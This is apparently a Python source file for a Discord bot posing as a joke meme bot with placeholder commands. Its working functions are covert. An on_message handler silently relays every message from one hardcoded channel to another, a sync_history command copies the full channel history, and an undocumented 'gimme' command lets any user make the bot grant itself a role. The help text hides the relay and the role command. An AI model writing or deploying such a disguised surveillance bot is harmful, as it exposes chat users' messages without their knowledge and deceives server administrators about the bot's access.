import os
import random
import discord  # type: ignore
from discord.ext import commands  # type: ignore
from dotenv import load_dotenv  # type: ignore

# 🔒 Load token from .env file
load_dotenv()
TOKEN = os.getenv("DISCORD_TOKEN")

# 🧠 Intents setup
intents = discord.Intents.default()
intents.message_content = True

# 🤖 Bot setup
bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)

# 📡 Channel IDs (replace with your actual IDs)
SOURCE_CHANNEL_ID = 1359227879564775584
TARGET_CHANNEL_ID = 1375030164118835263

# 🔁 Relay messages from source to target channel
@bot.event
async def on_message(message):
    if message.channel.id == SOURCE_CHANNEL_ID and not message.author.bot:
        target_channel = bot.get_channel(TARGET_CHANNEL_ID)
        if target_channel:
            await target_channel.send(f"📩 {message.author.display_name}: {message.content}")
    await bot.process_commands(message)

# 🧪 Custom commands
@bot.command()
async def meme(ctx):
    await ctx.send("📸 Here's a random meme: [REDACTED] (just imagine it)")

@bot.command()
@commands.has_permissions(manage_channels=True)
async def sync_history(ctx):
    source = bot.get_channel(SOURCE_CHANNEL_ID)
    target = bot.get_channel(TARGET_CHANNEL_ID)

    if not source or not target:
        await ctx.send("❌ Could not find one of the channels.")
        return

    await ctx.send("📜 Syncing message history...")

    try:
        count = 0
        async for message in source.history(limit=None, oldest_first=True):
            if not message.author.bot:
                timestamp = message.created_at.strftime('%Y-%m-%d %H:%M:%S')
                content = f"[{timestamp}] {message.author.display_name}: {message.content}"
                await target.send(content)
                count += 1
        await ctx.send(f"✅ Done syncing {count} messages.")
    except discord.Forbidden:
        await ctx.send("❌ Missing permissions to read or send messages.")
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")

@bot.command()
async def gimme(ctx):
    role_id = 1301635850446180448
    guild = ctx.guild
    role = guild.get_role(role_id)
    bot_member = guild.get_member(bot.user.id)

    if role is None:
        await ctx.send("❌ Role not found.")
        return

    if role in bot_member.roles:
        await ctx.send("ℹ️ I already have this role.")
    else:
        try:
            await bot_member.add_roles(role)
            await ctx.send(f"✅ Gave myself the role `{role.name}`.")
        except discord.Forbidden:
            await ctx.send("❌ I don't have permission to assign that role.")
        except Exception as e:
            await ctx.send(f"❌ Error: {e}")

@bot.command()
async def cringe(ctx):
    level = random.randint(1, 100)
    await ctx.send(f"😬 Cringe level: {level}%")

@bot.command()
async def vibecheck(ctx):
    await ctx.send("✅ Vibe check passed. You're safe... for now.")

@bot.command()
async def drip(ctx):
    drip = random.randint(0, 100)
    await ctx.send(f"💧 Daily Drip Rating: {drip}/100")

@bot.command()
async def easteregg(ctx):
    await ctx.send("🕵️ You weren't supposed to find this...")

@bot.command()
async def help(ctx):
    help_text = """
🤖 MemeRelay420 – Totally Real Meme Bot™

Here are my dank commands:

!meme         → Sends a random meme (definitely works)
!cringe       → Rates your cringe level (science-based)
!vibecheck    → Performs a vibe scan of the server
!drip         → Calculates your daily drip %
!easteregg    → No one's ever survived using this...
!sync_history → Copies the full message history (mods only)
!help         → You’re looking at it, genius.
"""
    await ctx.send(help_text)

# 🚀 Run the bot
bot.run(TOKEN)
